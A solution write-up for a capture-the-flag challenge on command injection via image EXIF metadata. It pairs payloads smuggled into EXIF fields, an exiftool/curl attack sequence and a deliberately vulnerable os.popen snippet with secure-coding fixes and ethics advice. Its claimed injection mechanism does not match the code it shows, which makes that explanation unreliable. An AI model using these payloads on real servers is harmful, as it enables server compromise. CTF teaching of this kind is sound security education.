# EXIF Command Injection Challenge - Complete Solution

## Challenge Description

> This simple web app lets you upload images to inspect their EXIF metadata. But something feels off… maybe your uploads are being examined more closely than you realize. Can you get the server to execute a command of your choosing and expose the hidden flag.txt file?
>
> Note: Only image uploads are allowed. No brute force needed — just the right approach and format.

**Target**: http://chall.0xfun.org:61927/  
**Goal**: Execute arbitrary commands to read `flag.txt`

## Solution Overview

This challenge involves exploiting a **command injection vulnerability** in EXIF metadata processing. The server processes uploaded images and extracts EXIF metadata, but fails to properly sanitize the data before using it in shell commands. This allows attackers to inject malicious commands through EXIF fields.

## Quick Start

### Option 1: Automated Bash Script (Fastest)
```bash
chmod +x exploit.sh
./exploit.sh
```

### Option 2: Python Exploit
```bash
pip install -r requirements.txt
python3 exploit_exif_injection.py
```

### Option 3: Manual Exploitation (Educational)
```bash
# 1. Create an image
convert -size 100x100 xc:red exploit.jpg

# 2. Inject malicious EXIF data
exiftool -Artist="'; cat flag.txt; echo '" exploit.jpg

# 3. Upload and capture response
curl -F "file=@exploit.jpg" http://chall.0xfun.org:61927/upload
```

## Repository Structure

```
.
├── exploit_exif_injection.py  # Comprehensive Python exploit tool
├── exploit.sh                 # Automated bash exploitation script
├── vulnerable_server.py       # Local test server (for practice)
├── requirements.txt           # Python dependencies
├── EXPLOIT_README.md          # Detailed technical documentation
├── QUICKSTART.md             # Quick start guide
├── WALKTHROUGH.md            # Step-by-step exploitation tutorial
└── SOLUTION.md               # This file
```

## How It Works

### The Vulnerability

The server likely uses code similar to this:

```python
# VULNERABLE CODE - DO NOT USE IN PRODUCTION
import os

def extract_exif(image_path):
    # Directly interpolating path into shell command
    cmd = f"exiftool -Artist {image_path}"
    output = os.popen(cmd).read()  # Executes in shell context!
    return output
```

When EXIF data is extracted and processed, if any field contains shell metacharacters, they will be interpreted by the shell:

```python
# If Artist field contains: '; cat flag.txt; echo '
# The command becomes: exiftool -Artist '; cat flag.txt; echo '
# Which executes THREE commands:
#   1. exiftool -Artist ''
#   2. cat flag.txt (our injected command!)
#   3. echo ''
```

### Attack Vector

1. **Create a valid image** file (JPEG, PNG, etc.)
2. **Inject malicious commands** into EXIF metadata fields using `exiftool`
3. **Upload** the crafted image to the vulnerable server
4. **Server processes** EXIF data using vulnerable code
5. **Command executes** with server privileges
6. **Flag content** appears in the response

### Payload Techniques

| Technique | Payload | Description |
|-----------|---------|-------------|
| Semicolon | `'; cat flag.txt; echo '` | Terminates command, runs new one |
| Pipe | `test \| cat flag.txt` | Pipes output to command |
| Substitution | `test$(cat flag.txt)` | Command substitution |
| Backticks | `` test`cat flag.txt` `` | Alternative substitution |
| AND | `test && cat flag.txt` | Runs if previous succeeds |
| OR | `test \|\| cat flag.txt` | Runs if previous fails |

### EXIF Fields Targeted

- **Artist** (Tag 315): Common display field
- **Copyright** (Tag 33432): Often shown in galleries
- **Software** (Tag 305): May be logged
- **Make/Model** (Tags 271/272): Device information
- **Comment**: User comment field

## Testing Locally

Before attacking the real server, practice with the included vulnerable server:

### Start the Vulnerable Server
```bash
python3 vulnerable_server.py
```

The server will start on http://localhost:5000 with:
- Web interface at http://localhost:5000
- Upload endpoint at http://localhost:5000/upload
- API endpoint at http://localhost:5000/api/upload
- A test flag.txt file in the upload directory

### Test Your Exploit
```bash
# Against local server
./exploit.sh http://localhost:5000/upload

# Or with Python
python3 exploit_exif_injection.py http://localhost:5000/upload
```

## Detailed Documentation

- **[QUICKSTART.md](QUICKSTART.md)** - Fast track to exploitation
- **[WALKTHROUGH.md](WALKTHROUGH.md)** - Step-by-step tutorial with troubleshooting
- **[EXPLOIT_README.md](EXPLOIT_README.md)** - Technical deep dive, defenses, and mitigation

## Tools Provided

### 1. exploit_exif_injection.py
Comprehensive Python exploit with features:
- Multiple injection payload types
- Automatic malicious image creation
- HTTP upload functionality
- Response analysis and flag detection
- Detailed help and usage examples

```bash
python3 exploit_exif_injection.py --help
```

### 2. exploit.sh
Fully automated bash script that:
- Creates a base image
- Injects multiple payloads into different EXIF fields
- Uploads to target server
- Analyzes response for flags
- Tries alternative endpoints

```bash
./exploit.sh [target_url] [command]
```

### 3. vulnerable_server.py
Educational vulnerable server for:
- Testing exploits safely
- Understanding the vulnerability
- Practicing exploitation techniques
- Learning secure coding practices

```bash
python3 vulnerable_server.py
```

## Requirements

### For Exploitation
```bash
pip install -r requirements.txt
```

Required packages:
- Pillow (image manipulation)
- requests (HTTP client)
- Flask (for vulnerable server)

### System Tools
- **exiftool**: For EXIF manipulation
  ```bash
  # Ubuntu/Debian
  sudo apt-get install libimage-exiftool-perl
  
  # macOS
  brew install exiftool
  ```

- **curl**: For HTTP requests (usually pre-installed)

- **ImageMagick** (optional): For image creation
  ```bash
  sudo apt-get install imagemagick
  ```

## Security Lessons

### What Makes Code Vulnerable

❌ **Bad**: Using `os.system()` or `os.popen()` with user input
```python
os.popen(f"exiftool {user_input}")  # NEVER DO THIS
```

❌ **Bad**: Shell=True with string concatenation
```python
subprocess.run(f"exiftool {file}", shell=True)  # VULNERABLE
```

### Secure Implementations

✅ **Good**: Use subprocess with list arguments
```python
subprocess.run(['exiftool', '-Artist', filepath], capture_output=True)
```

✅ **Better**: Use specialized libraries
```python
from PIL import Image
from PIL.ExifTags import TAGS

img = Image.open(filepath)
exif = img.getexif()
```

✅ **Best**: Input validation + secure API
```python
# Validate filename
if not re.match(r'^[a-zA-Z0-9_.-]+$', filename):
    raise ValueError("Invalid filename")

# Use library, not shell command
img = Image.open(filepath)
```

## Troubleshooting

### Connection Issues
- Verify target URL is correct
- Check if server is online
- Try with/without trailing slash
- Test different endpoints (/upload, /api/upload, /)

### Upload Failures
- Try different form field names (file, image, upload)
- Check file size limits
- Verify image format is accepted
- Test with curl vs. browser upload

### No Flag in Response
- Try all payload types
- Check different EXIF fields
- Look in HTML source code
- Check for base64 encoding
- Try reading different file paths

See [WALKTHROUGH.md](WALKTHROUGH.md) for detailed troubleshooting.

## Success Indicators

You've successfully exploited the vulnerability when:
- ✅ You see command output in the server response
- ✅ The flag appears (format: `flag{...}` or similar)
- ✅ You can read arbitrary files on the server

## Educational Value

This challenge teaches:
1. **Web Application Security**: Understanding injection vulnerabilities
2. **EXIF Metadata**: How image metadata works
3. **Command Injection**: Shell command exploitation techniques
4. **Secure Coding**: How to prevent these vulnerabilities
5. **Penetration Testing**: Ethical hacking methodology

## Important Notes

### Legal and Ethical Considerations

⚠️ **This exploit is for educational purposes only!**

- ✅ Use on authorized systems only (like this challenge)
- ✅ Practice on the included vulnerable_server.py
- ✅ Learn to defend against these attacks
- ❌ Never attack systems without permission
- ❌ Unauthorized access is illegal

### Responsible Disclosure

If you find similar vulnerabilities in real applications:
1. Do not exploit them beyond confirming the vulnerability
2. Report to the organization privately
3. Give them time to fix before public disclosure
4. Follow responsible disclosure practices

## Further Learning

### Related Vulnerabilities
- SQL Injection
- LDAP Injection
- XML Injection
- Template Injection
- Server-Side Request Forgery (SSRF)

### Resources
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

### Practice Platforms
- HackTheBox
- TryHackMe
- PentesterLab
- OverTheWire
- CTFtime

## Credits

This solution demonstrates:
- Multiple exploitation techniques
- Automated and manual approaches
- Educational vulnerable server
- Comprehensive documentation
- Security best practices

Created for educational purposes to demonstrate web application security concepts.

## License

This educational material is provided under the repository's license for learning purposes only.

---

**Remember**: Use your powers for good! 🛡️

Help make the internet more secure by learning to identify and fix vulnerabilities responsibly.
